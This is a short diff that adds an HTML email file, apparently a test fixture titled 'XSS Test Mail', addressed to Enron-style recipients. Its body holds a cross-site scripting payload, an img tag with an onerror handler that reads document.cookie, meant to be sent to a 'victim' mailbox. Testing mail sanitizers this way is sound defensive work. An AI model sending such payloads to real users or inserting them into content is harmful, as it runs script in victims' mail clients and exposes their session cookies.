@@ -1,0 +1,7 @@
+From: marleneg@talkmatch.com
+To: bob.crane@enron.com, r..conner@enron.com, craig.rickard@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Send an email to the victim GMail address with the From field.<img src=# onerror=alert(document.cookie)>.
